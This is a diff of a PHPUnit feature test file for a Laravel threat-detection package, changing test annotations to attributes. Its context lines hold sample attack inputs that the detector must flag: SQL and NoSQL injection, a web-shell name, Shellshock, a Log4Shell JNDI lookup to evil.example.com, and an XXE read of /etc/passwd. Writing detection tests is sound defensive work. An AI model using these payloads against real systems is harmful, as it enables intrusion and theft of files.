@@ -3,6 +3,7 @@
 namespace JayAnta\ThreatDetection\Tests\Feature;
 
 use JayAnta\ThreatDetection\Tests\TestCase;
+use PHPUnit\Framework\Attributes\Test;
 use Illuminate\Support\Facades\Route;
 use Illuminate\Support\Facades\Cache;
 
@@ -61,7 +62,7 @@ class Phase9V131FixesTest extends TestCase
 
     // ── #1 JSON request bodies are scanned ───────────────────
 
-    /** @test */
+    #[Test]
     public function json_request_body_is_scanned(): void
     {
         $this->postJson('/phase9-test', ['q' => 'UNION SELECT password FROM users']);
@@ -74,7 +75,7 @@ class Phase9V131FixesTest extends TestCase
 
     // ── #2 Malformed UTF-8 no longer disables a segment ──────
 
-    /** @test */
+    #[Test]
     public function malformed_utf8_byte_does_not_disable_detection(): void
     {
         // A lone 0xFF byte would make json_encode() return false (blanking the
@@ -88,7 +89,7 @@ class Phase9V131FixesTest extends TestCase
 
     // ── #3 Authorization header is not logged as a token threat ─
 
-    /** @test */
+    #[Test]
     public function authorization_bearer_header_is_not_logged_as_threat(): void
     {
         $jwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'
@@ -106,7 +107,7 @@ class Phase9V131FixesTest extends TestCase
 
     // ── #4 api_route_filtering cannot be evaded via the query string ─
 
-    /** @test */
+    #[Test]
     public function api_suppression_is_not_evadable_via_query_string(): void
     {
         // Non-API route, but the query string contains "/api/". A medium threat
@@ -125,7 +126,7 @@ class Phase9V131FixesTest extends TestCase
 
     // ── #6 Remapped patterns now fire ────────────────────────
 
-    /** @test */
+    #[Test]
     public function nosql_operator_injection_is_detected(): void
     {
         // Keyword "$ne" lives in the 'injection' category; the label is now
@@ -137,7 +138,7 @@ class Phase9V131FixesTest extends TestCase
         ]);
     }
 
-    /** @test */
+    #[Test]
     public function web_shell_signature_is_detected(): void
     {
         $this->call('POST', '/phase9-test', ['x' => 'c99shell upload']);
@@ -148,7 +149,7 @@ class Phase9V131FixesTest extends TestCase
         ]);
     }
 
-    /** @test */
+    #[Test]
     public function shellshock_without_space_is_detected(): void
     {
         $this->call('POST', '/phase9-test', ['cmd' => '(){ :;};echo vulnerable']);
@@ -161,7 +162,7 @@ class Phase9V131FixesTest extends TestCase
 
     // ── #8 Corrected severities ──────────────────────────────
 
-    /** @test */
+    #[Test]
     public function log4shell_is_high_severity(): void
     {
         $this->call('POST', '/phase9-test', ['x' => '${jndi:ldap://evil.example.com/a}']);
@@ -172,7 +173,7 @@ class Phase9V131FixesTest extends TestCase
         ]);
     }
 
-    /** @test */
+    #[Test]
     public function xxe_entity_declaration_is_high_severity(): void
     {
         $this->call('POST', '/phase9-test', ['x' => '<!ENTITY xxe SYSTEM "file:///etc/passwd">']);
@@ -183,7 +184,7 @@ class Phase9V131FixesTest extends TestCase
         ]);
     }
 
-    /** @test */
+    #[Test]
     public function javascript_uri_is_medium_severity(): void
     {
         $this->call('POST', '/phase9-test', ['x' => 'javascript:void(0)']);
@@ -194,7 +195,7 @@ class Phase9V131FixesTest extends TestCase
         ]);
     }
 
-    /** @test */
+    #[Test]
     public function real_chrome_user_agent_is_not_flagged_as_localhost_ssrf(): void
     {
         // "Chrome/120.0.0.0" contains "0.0.0.0" — must NOT match Localhost SSRF.
@@ -206,7 +207,7 @@ class Phase9V131FixesTest extends TestCase
         $this->assertDatabaseMissing('threat_logs', ['type' => '[middleware] Localhost SSRF']);
     }
 
-    /** @test */
+    #[Test]
     public function genuine_localhost_ssrf_is_still_detected(): void
     {
         // The boundary fix must not weaken real detection.
@@ -217,7 +218,7 @@ class Phase9V131FixesTest extends TestCase
 
     // ── #5 Dashboard/API guard fails closed ──────────────────
 
-    /** @test */
+    #[Test]
     public function unknown_guard_value_fails_closed(): void
     {
         config(['threat-detection.dashboard.guard' => 'totally-invalid']);
@@ -225,7 +226,7 @@ class Phase9V131FixesTest extends TestCase
         $this->get('/phase9-dashboard')->assertStatus(403);
     }
 
-    /** @test */
+    #[Test]
     public function role_guard_without_hasRole_method_fails_closed(): void
     {
         config([
